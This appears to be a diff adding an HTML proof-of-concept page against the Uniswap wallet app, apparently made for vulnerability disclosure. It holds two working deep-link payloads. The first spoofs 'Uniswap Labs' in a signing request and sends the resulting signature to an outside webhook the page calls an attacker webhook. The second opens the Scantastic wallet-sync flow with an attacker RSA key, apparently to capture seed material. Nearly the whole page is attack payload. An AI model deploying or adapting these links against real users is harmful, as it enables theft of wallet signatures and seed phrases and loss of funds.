@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Uniswap PoC Test</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: -apple-system, sans-serif; padding: 20px; max-width: 600px; margin: 0 auto; background: #fff; }
+h1 { color: #ff0073; font-size: 22px; }
+.test { border: 2px solid #ff0073; padding: 20px; margin: 15px 0; border-radius: 12px; }
+h2 { color: #ff0073; font-size: 18px; margin-top: 0; }
+button { background: #ff0073; color: white; border: none; padding: 16px 24px; border-radius: 12px; font-size: 18px; width: 100%; cursor: pointer; margin: 5px 0; }
+button:active { background: #e60069; }
+.note { font-size: 14px; color: #666; margin-top: 10px; line-height: 1.4; }
+a { color: #ff0073; }
+</style>
+</head>
+<body>
+<h1>Uniswap PoC Test</h1>
+
+<div class="test">
+<h2>Test 1: UwuLink Signature Exfil</h2>
+<p>Opens a signing request showing "Uniswap Labs" as the dapp. Safe to sign - the message is benign.</p>
+<button onclick="window.location.href='uniswap://uwulink?uwulink{"method":"personal_sign","value":"0x5369676e20696e20746f20556e6973776170204c61627320746f2076657269667920796f75722077616c6c65742e205468697320726571756573742077696c6c206e6f742074726967676572206120626c6f636b636861696e207472616e73616374696f6e206f7220636f737420616e792067617320666565732e","chainId":1,"dapp":{"name":"Uniswap Labs","url":"https://uniswap.org","icon":"https://app.uniswap.org/favicon.ico"},"webhook":"https://webhook.site/aacef163-7e1b-4bda-ab11-d748c1ee4cbc"}'">Open UwuLink</button>
+<p class="note">After signing, the signature is sent to an attacker webhook. Check it here: <a href="https://webhook.site/aacef163-7e1b-4bda-ab11-d748c1ee4cbc">webhook receiver</a></p>
+</div>
+
+<div class="test">
+<h2>Test 2: Scantastic Seed Exfil</h2>
+<p>Opens the Scantastic wallet-sync modal with attacker RSA key. DO NOT click Continue unless using a throwaway wallet.</p>
+<button onclick="window.location.href='uniswap://scantastic?pubKey=%7B%22alg%22%3A%22RSA-OAEP-256%22%2C%22kty%22%3A%22RSA%22%2C%22n%22%3A%22hywGfne3bod1zkyZtkuMtMPShf2C5vzf7nnYTfJ8brEG9pdBVQ0Ri7z3kJX-sWz_hYCeXyRvVtZpkAC6TqEuPqelyWlSiKRWXRqfhvZ4xFT_ndreY2MDN54CuENUGZZNDUQ8jPkOGF5RCB8zFNuwTIN1RFT3joy0opTZewzZFUCcG0_qxLSF6USPilZ6Ay5GiicdZjE9rwH7qBPCjFr900XW3YkcyRRqfSBw9rhH_eULJAraZqQag0Lx0OjdcKqsDw8jG9YhkukWpA5tQ8z4rDlaV_e-edlu_qaQpJ4lX-w6N43ZMoxVpaScI9d85PS1hLiKPkAYFEZ2dL2hF7ViYbPvooZD9LiPLUlmxScJNQXs-XGOUe-iuGX8G1ulorkcWp5NWJZWz3f24A8KYdaXswyx3aXLgOnpEWJ-XPizdRqWMuXZreTaSkj2ZTmxqUVYUUcDhOpJlH4OODVf2BBQLZT-XOqx6kwzeCZAtwxfU405OrMJ52_qc6Uj26DanBStr4o2Pv0ABurHEbM2bxGhcfYcFQdoHcIZ9BwBBsQuGzKgsvJ-p4KGXj6aprRF_oV8ZsHYv2rdLc1D4PrmHZi1qCIi7-BwV6IyPQAuc3JpZmGvHte-2hWIvDwiW2taVs4998G3HUvne-NoVmP0cEU0HjAaXWNZ33IrDw86Qm2bZhk%22%2C%22e%22%3A%22AQAB%22%7D&uuid=00000000-0000-0000-0000-000000000000&vendor=MacBook&model=Pro&browser=Chrome'">Open Scantastic</button>
+<p class="note">Just opening this and seeing the modal (or an error) is enough for the PoC.</p>
+</div>
+
+</body>
+</html>
